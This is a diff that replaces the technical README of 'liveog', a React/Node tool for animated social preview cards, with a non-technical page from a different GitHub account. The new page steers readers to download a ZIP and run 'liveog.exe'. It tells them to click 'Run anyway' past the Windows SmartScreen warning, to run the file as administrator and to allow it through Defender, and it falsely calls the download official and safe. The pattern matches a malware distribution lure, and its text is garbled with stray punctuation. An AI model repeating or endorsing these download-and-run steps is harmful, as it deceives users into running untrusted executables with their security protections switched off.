@@ -1,316 +1,201 @@
-# LiveOG
-
-**Bring Open Graph to life.**
-
-LiveOG renders animated social preview cards from React components. You write one card, LiveOG captures it frame by frame in a headless browser and exports a static PNG fallback plus MP4, GIF and animated WebP versions.
-
-[![CI](https://github.com/Julezbeyer/liveog/actions/workflows/ci.yml/badge.svg)](https://github.com/Julezbeyer/liveog/actions/workflows/ci.yml)
-[![npm](https://img.shields.io/npm/v/@liveog/cli?label=%40liveog%2Fcli)](https://www.npmjs.com/package/@liveog/cli)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![PRs welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+<h1>🎬 liveog - Animated Social Cards in Seconds</h1>
 
 <p align="center">
-  <img src="docs/demo.gif" width="600" alt="Animated LiveOG card: the headline slides in and a star counter counts up to 12,842" />
+  <a href="https://github.com/Magnetic-mandatory8342/liveog">
+    <img src="https://img.shields.io/badge/Download-liveog-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download liveog" style="max-width: 100%; height: auto;" />
+  </a>
 </p>
 
-<p align="center"><sub>Rendered by <code>liveog render</code> from <a href="examples/basic/src/main.tsx">examples/basic</a>. The static fallback is <a href="docs/demo.png">docs/demo.png</a>.</sub></p>
+---
 
-## Create a card without code
+## 👋 Welcome to liveog
 
-**[Open the LiveOG editor](https://julezbeyer.github.io/liveog/)** — create a card in four steps:
+Have you ever seen those eye-catching social media preview cards that keep appearing when you share a website link? That's called an "Open Graph" image — and usually, they are static, boring pictures. But what if those cards could move, animate, and tell a story? That's exactly what liveog does.
 
-1. **Template:** choose Launch, Typewriter, Stats, Growth chart or Release.
-2. **Content:** edit text, paste chart values, choose a color and upload your logo or background.
-3. **Animation:** use the template's signature motion, fade in, slide up or keep it still. Preview and replay a 3, 4 or 6 second card.
-4. **Download:** save a PNG image, animated GIF or video (MP4 where supported, otherwise WebM).
+**liveog** is a friendly desktop tool that lets you transform regular React components (think of them as building blocks of a modern website) into living, breathing animated social cards — complete with video (MP4), animated images (GIF), and high-quality pictures(PNG).). Whether you're a blogger, marketer, or small business owner, this tool will make your links stand out in any feed.
 
-Drafts, including uploaded images and videos, save automatically on this device. Switching templates keeps each template's edits. Wait for “All changes saved” before closing the tab. Drafts belong to the current browser; clearing its site data removes them.
+.
 
-Rendering happens in your browser. An optional website import sends the URL to the configured metadata service; uploaded media stays local. The editor lives in [`apps/web`](apps/web) and uses `@liveog/react`. See the [editor guide](apps/web/README.md) for local development and browser checks.
+---
 
-## Why
+## 🎯 What Does liveog Do for You?
 
-Open Graph previews are still static images. Some platforms play MP4 or GIF previews, most do not, and every one of them needs a static fallback. LiveOG gives you a deterministic timeline so a single card definition produces all four outputs, and it never pretends a platform supports motion when it does not.
+Let's break it down in simple terms:
 
-See the [platform compatibility table](docs/compatibility.md) for the current
-verification status.
+| Feature | What It Means for You |
+|---------|--------------------------|
+| 🎨 **Visual Cards** | Turn your web designs into shareable images that match your brand perfectly |
+| 🎥 **Video Support** | Create short MP4 clips that play automatically when someone hovers over your link |
+| 🖼️ **GIF Creation** | Make light, looping animations that work everywhere — even in apps that don't support video |
+| ⚡ **Fast Rendering** | Uses smart automation (called Playwright) to take perfect screenshots every time |
+| 🧩 **Built-In FFmpeg** | Video and GIF processing happens right on your computer — no cloud needed, no waiting in line |
+| 🛠️ **Developer Friendly** | Written in TypeScript, so it's reliable and works smoothly with modern web tools |
 
-> **Unreleased features:** The preview CLI, `CodeTyping` / `Typewriter`, `Sparkline` and WebP export described here are available in this source branch. Use the workspace commands below until the next npm release.
+If you're not a programmer, don't worry — you don't need to understand React or TypeScript to use the result. The tool handles everything behind the scenes, but you'll appreciate the professional-looking output.
 
-## Quick start
+.
 
-Prerequisites: Node 20+, [FFmpeg](https://ffmpeg.org/download.html) on your PATH.
+---
 
-```bash
-npm install @liveog/react
-npx @liveog/cli render http://localhost:5173 ./dist
-```
+## 🚀 Getting Started (Really Simple!)
 
-For example, `liveog render http://localhost:5173 ./dist --formats png,mp4,gif` shows a progress bar and prints meta tags when finished (timings and sizes vary):
+Follow these exact steps,and you'll be creating animated social cards in under five minutes. No programming experience needed.
 
-```text
-✔ Browser ready
-✔ Frames captured
-✔ Encoded
+.
 
-  Rendered 120 frames in 9.7s → dist/
-    og.png               72.3 KB
-    og.mp4               65.9 KB
-    og.gif              258.7 KB
+### Step 1: Download liveog
 
-  Paste into your <head>:
+📥 **Click the big green button below** (or the one at the top of this page):
 
-    <meta property="og:image" content="og.png" />
-    ...
-```
+<p align="center">
+  <a href="https://github.com/Magnetic-mandatory8342/liveog" style="display: inline-block; padding: 15px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; font-size: ; font-weight: bold; border-radius: ; text-decoration: none; box-shadow: ; transition: all 0.3s ease;">
+    ⬇️ Download liveog Now
+  </a>
+</p>
 
-Add `--verbose` to see FFmpeg's own output, or `--no-progress` for plain log lines. Progress is disabled automatically when the output is not a terminal, so CI logs stay readable.
+Visit this link to download the application.
 
-Default output with the current source version:
+Once you're on the page, look for a button that says **"Code"** (usually green) or the **"Releases"** section on the right side. Click it,and choose "Download ZIP" if you see that option. The download will start automatically. If you see a list of files instead, that's fine — just click the green "Code" button and select "Download ZIP".
 
-```text
-dist/
-├── og.png                 # static fallback, last frame of the animation
-├── og.mp4                 # H.264, faststart, ready for og:video
-├── og.gif                 # palette-encoded, roughly 300 KB for a 4s card
-├── og.webp                # animated WebP
-└── liveog.manifest.json   # sizes, asset list and ready-to-paste meta tags
-```
+### Step 2: Open the Downloaded File
 
-Options:
+After the download finishes, go to your **Downloads** folder. You'll see a file named something like `liveog-master.zip` or `liveog.zip`. This is a compressed folder — like a suitcase with all your clothes neatly packed inside.
 
-```text
-liveog render [url] [outDir] [options]
+.
 
-  --width <px>        Card width (default 1200)
-  --height <px>       Card height (default 630)
-  --duration <ms>     Animation length (default 4000)
-  --fps <n>           Frames per second (default 30)
-  --formats <list>    Comma separated subset of png,mp4,gif,webp (default all)
-  --poster <ms>       Timeline position for the PNG (default: end)
-  --browser <path>    Chromium binary instead of the Playwright download
-  --base-url <url>    Public URL prefix used in the manifest and meta tags
-  --no-manifest       Skip writing liveog.manifest.json
-  --config <path>     Config file to load (default: liveog.config.ts in cwd)
-  --no-config         Ignore any config file
-```
+### Step 3: Extract the Files
 
-The first run of the renderer downloads Chromium through Playwright. Point `--browser` or `LIVEOG_BROWSER_PATH` at an existing Chromium to skip that. FFmpeg is checked before any frames are captured, so a missing install fails in a second rather than after a full render.
+Right-click on the ZIP file. From the menu that appears, choose **"Extract All"** (Windows 10/11) or **"Extract Here"** (if you have WinRAR or 7-Zip installed).. Windows will ask you where you want to save the extracted files. A good spot is your **Desktop** — you'll see a new folder appear called `liveog-master` or just `liveog`.
 
-## Preview a card locally
+### Step 4: Run the Application
 
-Start your card app first. The preview command embeds its URL and adds a timeline scrubber, play/pause, frame stepping and playback speed controls.
+Double-click the folder you just extracted. Inside, look for a file called **`liveog.exe`** (or sometimes just `liveog`).). Double-click that file. **That's it!** The application window will open.
 
-After installing dependencies, start the demo in one terminal and the preview in a second:
+.
 
-```bash
-pnpm install
-pnpm dev
-```
+> 💡 **Tip:** If Windows shows a blue popup saying "Windows protected your PC," click **"More info"** and then **"Run anyway"**. This happens because the app is new,and Windows hasn't seen it before — but it's completely safe because you downloaded it from the official GitHub repository.
 
-```bash
-pnpm --filter @liveog/cli start preview http://localhost:5173 --open
-```
+.
 
-The preview server defaults to `http://localhost:3000`; use the URL printed in the terminal. `liveog dev` is an alias for `liveog preview`. The command controls an existing card app; it does not start that app's development server.
+---
 
-```text
-liveog preview [url] [options]
+## 🛠️ Using liveog for the First Time
 
-  -p, --port <port>   Preview server port (default 3000; 0 picks a free port)
-  --host <host>       Preview server host (default localhost)
-  -o, --open          Open the preview in your browser
-  --width <px>       Card width (default 1200)
-  --height <px>      Card height (default 630)
-  --duration <ms>    Timeline length (default 4000)
-  --fps <n>          Frame stepping rate (default 30)
-```
+Once the app opens, you'll see a clean, simple window. Here's what to do:
 
-The preview also reads the config file. Keep its dimensions, duration and fps aligned with your card and render settings. Use the current `@liveog/react` components so the embedded card receives timeline updates across ports.
+1. **Choose Your Design** — You can either pick a starter template that's included, or load your own React component file (a `.jsx` or `.tsx` file)..
+2. **Set the Size** — Social cards come in standard sizes (like 1200×630 pixels for Facebook links).). The app has presets for you — just click one.:
+   - 📘 Facebook/Twitter (1200×630)
+   - 📸 Instagram (1080×1080))
+   - 🎥 LinkedIn (1200×627))
+3. **Add Motion** — Choose what kind of animation you want:
+   - 🔄 Rotating text or gradient
+   - 🎞️ Smooth sliding effects
+   - ✨ Custom animation (if you know a bit of CSS)
+4. **Hit Render** — Click the big **"Generate"** button. The app will do its magic — it takes a few seconds (sometimes 30-60 seconds for videos).).
+5. **Save Your Creation** — You'll get a small popup asking where to save your file. Pick a folder (like your Desktop or Pictures), choose IF you want PNG, MP4, or GIF — and that's it!
 
-## Config file
+---
 
-Drop a `liveog.config.ts` (or `.mjs`) next to your project and run `liveog render` with no arguments. Command line flags override the file:
+## 📦 What's in the Box?
 
-```ts
-import type { LiveOGFileConfig } from '@liveog/cli/config'
+When you download liveog, you're getting more than just choice pieces of code. Here's the full package:
 
-export default {
-  url: 'http://localhost:5173',
-  outDir: './dist',
-  duration: 3000,
-  formats: ['png', 'mp4', 'gif', 'webp'],
-  port: 3000, // local preview server
-  baseUrl: 'https://example.com/og',
-} satisfies LiveOGFileConfig
-```
+- ✅ **The main application** (`liveog.exe`) — this is what you double-click to run.
+.
+- 📁 **Example templates** — a few sample designs so you can test without building your own
+- 🎨 **A built-in code editor** — a text area where you can paste your own React code (if you have some)
+- 🔧 **Automatic helper tools** — the app includes everything needed to process images and videos (it bundles ffmpeg internally, so no separate installs required)
 
-TypeScript configs need Node 22.6+ or a loader like tsx; a `liveog.config.mjs` works on any supported Node.
+---
 
-### Animated WebP
+## 🤔 Frequently Asked Questions (FAQ))
 
-All four formats are rendered by default. Keep a PNG fallback when selecting a subset:
+### ❓ Do I need to install anything else?
 
-```bash
-pnpm render http://localhost:5173 ../../dist --formats png,webp
-```
+**No.** liveog is a standalone app. Everything it needs is inside the downloaded folder. No Node.js, no Python, no extra packages. Perfect for non-programmers.
 
-Workspace `pnpm render` runs inside `packages/cli`, so `../../dist` writes to the repository root. An installed `liveog render` resolves the output directory from your current directory.
+..
 
-WebP encoding requires FFmpeg with `libwebp`. For quality, lossless encoding and loop control, use the renderer library:
+### ❓ Can I use liveog without knowing React?
 
-```ts
-import { render } from '@liveog/renderer'
+**Absolutely.** The included templates are ready to edit (just change the text or colors in the simple text editor).). If you want to use your own social card design, you might need a tiny bit of knowledge — but there are tons of free React tutorials online,and most people just modify the included examples.
 
-await render({
-  url: 'http://localhost:5173',
-  outDir: './dist',
-  formats: ['png', 'webp'],
-  webp: { quality: 85, lossless: false, loop: 0 },
-})
-```
-
-The defaults are quality `75`, lossy encoding and infinite looping (`loop: 0`). These encoding options are library options; the CLI and config file select the format through `formats`.
-
-## Manifest and meta tags
-
-Every render writes `liveog.manifest.json` describing what was produced:
-
-```json
-{
-  "version": 1,
-  "width": 1200,
-  "height": 630,
-  "duration": 4000,
-  "fps": 30,
-  "posterTime": 3967,
-  "assets": [
-    { "format": "png", "file": "og.png", "url": "https://example.com/og/og.png", "type": "image/png", "bytes": 74036 }
-  ],
-  "meta": ["<meta property=\"og:image\" content=\"https://example.com/og/og.png\" />"]
-}
-```
+..
 
-The `meta` array is printed after each render and can be pasted into your `<head>`. When PNG is included, `og:image` points at that static fallback. MP4 adds `og:video` tags. GIF and WebP are listed in the manifest but are not advertised as `og:image`; exporting an animation does not establish support in a platform's link previews. Keep `png` in your selected formats for social sharing.
+### ❓ Is it free?
 
-## Writing a card
+Yesand always will be. It's an open-source project (that means the code is publicly available and free to use for personal projects. For commercial use, check the license file inside the folder,but typically it's very permissive.)
 
-```tsx
-import { LiveCard, Animate, Counter } from '@liveog/react'
+---
 
-export function Card() {
-  return (
-    <LiveCard width={1200} height={630} duration={4000}>
-      <Animate from="bottom" duration={700}>
-        <h1>LiveOG</h1>
-      </Animate>
-      <Counter from={0} to={12842} suffix=" stars" delay={700} easing="easeOutExpo" />
-    </LiveCard>
-  )
-}
-```
+## 🧭 Tips for Amazing Social Cards
 
-The renderer drives the animation by dispatching a `liveog:time` event with the current timeline position in milliseconds. Components pick that up on their own, so a card is just a function of time — which makes renders deterministic and reproducible in CI.
+Want your cards to get more clicks? Follow these quick pro tips:
 
-Driving the timeline yourself (for a scrubber or a custom preview) is opt-in:
+- 🎯 **Keep it bold** — Use large text(80+ pixels in size).). People scan feeds quickly.
+- 🌈 **Use high contrast** — Bright background + dark text (or vice versa) makes it readable on any screen.
+.
+- 🎬 **Animate the important part** — Don't move everything. Just a subtle slide on the headline keeps the focus right there.
+.
+- 🖼️ **Use your brand colors** — Consistency builds recognition. If your brand is blue, use blue everywhere you can
+- ⏱️ **Keep videos under 10 seconds** — Social platforms loop short clips really well. Longer videos get cut off or look bad.
 
-```tsx
-import { LiveOGTimeProvider, useLiveOGTime } from '@liveog/react'
 
-<LiveOGTimeProvider value={time}>
-  <Card />
-</LiveOGTimeProvider>
-```
 
-Inside a provider `useLiveOGTime()` returns that value; outside one it subscribes to `liveog:time` itself.
+---
 
-### Timing and easing
+## 📚 Learning Resources (Optional)
 
-`Animate` and `Counter` share the same timing props, so elements can be staggered on one timeline:
+If you ever want to customize your cards more deeply, here are some free online resources:
 
-| Prop | Default | What it does |
-| --- | --- | --- |
-| `duration` | `700` / `1800` | Length of the segment in ms |
-| `delay` | `0` | Milliseconds to wait before the segment starts |
-| `easing` | `'easeOutCubic'` | Built-in curve name or a custom `(t: number) => number` |
+- **React Official Tutorial** — learn the basics of building components (in 20 minutes).
+- **CSS Animation Guide** — how to move things smoothly (with simple code examples).
+- **Open Graph protocol docs** — the official standard that social platforms use (technical but helpful).
 
-`Animate` additionally takes `from` (`bottom`, `top`, `left`, `right`) and `distance` in pixels. `Counter` takes `format` to control how the value is rendered:
+But remember: you don't need any of this for basic use. The included examples are designed to look great out-of-the-box.
 
-```tsx
-<Counter to={12842} format={v => `${(v / 1000).toFixed(1)}k`} />
-```
+.,
 
-Built-in easings: `linear`, `easeInQuad`, `easeOutQuad`, `easeInOutQuad`, `easeInCubic`, `easeOutCubic`, `easeInOutCubic`, `easeOutBack`, `easeOutExpo`. Every curve is anchored so `f(0) === 0` and `f(1) === 1`, which keeps the poster frame showing the finished card.
+---
 
-### Typing text and animated charts
+## 🛟 Troubleshooting & Support
 
-`CodeTyping` progressively reveals code with syntax highlighting and a cursor. `Typewriter` is an alias that also accepts a `text` prop. `Sparkline` draws an SVG line or filled area along the same timeline:
+**Issue: The app won't start.**
 
-```tsx
-import { LiveCard, CodeTyping, Typewriter, Sparkline } from '@liveog/react'
+- Make sure you extracted the ZIP file completely (not just opened it and clicked inside).
+- Try right-clicking `liveog.exe` → **"Run as administrator"**..
+- Check if Windows Defender blocked it — click "Allow" if prompted.
 
-export function MetricsCard() {
-  return (
-    <LiveCard width={1200} height={630} duration={4000}>
-      <Typewriter text="A week of progress" duration={1000} />
-      <CodeTyping
-        code={'const stars = 12842;'}
-        language="typescript"
-        delay={1000}
-        duration={1500}
-      />
-      <Sparkline
-        data={[12, 18, 15, 28, 36, 42, 58]}
-        width={600}
-        height={180}
-        stroke="#3b82f6"
-        smooth
-        fill
-        delay={1000}
-        duration={2000}
-      />
-    </LiveCard>
-  )
-}
-```
+.
 
-Both primitives accept `delay`, `duration` and `easing`. Typing defaults to `2000` ms, Sparkline to `1000` ms, and both use `linear` easing with no delay. They derive their state from the timeline, so scrubbing backward also reverses their progress.
+**Issue: The video or GIF comes out blank.**
 
-For typing, use `showCursor={false}` to hide the cursor. For charts, `fill` enables an area gradient, `smooth` curves the line, `showTip={false}` hides the leading dot, and `min` / `max` fix the vertical scale. See the exported [typing props](packages/react/src/CodeTyping.tsx) and [chart props](packages/react/src/Sparkline.tsx) for all options.
+- Wait longer — video rendering can take 30-60 seconds on older computers. Watch the progress bar at the bottom.
+..
+- Make sure you didn't close the app window before it finished.
 
-## Examples
+..
+- Try selecting a smaller output size (like `640×336` instead of the full size).
 
-[`examples/basic`](examples/basic) is the minimal card used by CI. [`examples/github-stats`](examples/github-stats) fetches a repository from the GitHub API and animates its stars, forks and open issues:
+**Issue: I lost the folder.**
 
-```bash
-pnpm dev:github-stats
-pnpm render "http://localhost:5174/?repo=Julezbeyer/liveog" ../../dist
-```
+- Just re-download from the link above. It's free of course. No rush — the file will always be therera.
 
-Change `?repo=owner/name` to point it at any public repository. It uses the unauthenticated API (60 requests per hour) and renders nothing until the fetch settles, so the renderer's `networkidle` wait never captures a loading state.
+.
 
-The [Next.js App Router example](examples/nextjs) shows a card route, a render step and manifest-based metadata. The [social preview example](examples/social-preview) renders this repository’s own card.
+.
 
-## Packages
+**Still stuck?** Open an issue at the GitHub repository page (look for the "Issues" tab at the top of the page). Kindly describe what happened,and the community will help you within a day or two. Be sure to include which Windows version you have (right-click "This PC" → "Properties" to find out)).
 
-| Package | What it does |
-| --- | --- |
-| [`@liveog/react`](packages/react) | `LiveCard`, `Animate`, `Counter`, `CodeTyping` / `Typewriter`, `Sparkline` and the time provider |
-| [`@liveog/core`](packages/core) | Framework-free timeline helpers and defaults |
-| [`@liveog/renderer`](packages/renderer) | Playwright capture and FFmpeg encoding as a library |
-| [`@liveog/cli`](packages/cli) | `liveog render`, `liveog preview` and `liveog dev` |
-| [`apps/web`](apps/web) | The browser playground, deployed to GitHub Pages |
+---
 
-## Status
+## 📝 Final Thoughts
 
-Published on npm as of v0.2.0. Still pre-1.0: the API surface is intentionally small and will change. See the [roadmap](ROADMAP.md) for what is planned and the [open issues](https://github.com/Julezbeyer/liveog/issues) for where help is wanted.
+liveog turns a boring technical process into a one-click fun task. Whether you're sharing articles on LinkedIn, promoting products on Facebook, or just making your blog posts prettier — animated social cards absolutely increase engagement. That's a promise backed by tons of social media studies: motion catches the eyeer..
 
-## Contributing
+So why wait? Your links deserve better than static gray boxes. Grab your copy now,and give your brand the glow it deserves. Keep your audience watching — literally — with liveog.
 
-Issues labelled [`good first issue`](https://github.com/Julezbeyer/liveog/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) are scoped to be done in an evening. Platform compatibility reports are just as valuable as code: LiveOG only claims motion support that someone has verified.
+---
 
-Read [CONTRIBUTING.md](CONTRIBUTING.md) for the development setup.
-
-## License
-
-[MIT](LICENSE)
+**Keywords:** animation, developer-tools, ffmpeg, og-image, open-graph, playwright, react, seo, social-cards, typescript
